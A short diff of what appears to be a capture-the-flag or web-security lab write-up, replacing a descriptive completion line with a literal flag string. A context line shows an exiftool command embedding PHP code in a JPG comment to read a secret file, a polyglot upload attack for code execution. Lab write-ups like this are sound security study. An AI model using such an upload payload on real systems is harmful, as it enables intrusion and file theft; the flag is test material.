@@ -69,7 +69,7 @@ exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret'
 ---
 
 ## Completed Flag
-**`Carlos's secret successfully exfiltrated via polyglot PHP/JPG RCE`**
+**`1yDwfQ23MjYlmOgSS05RAw8ZeRfJJRCu`**
 
 ---
 
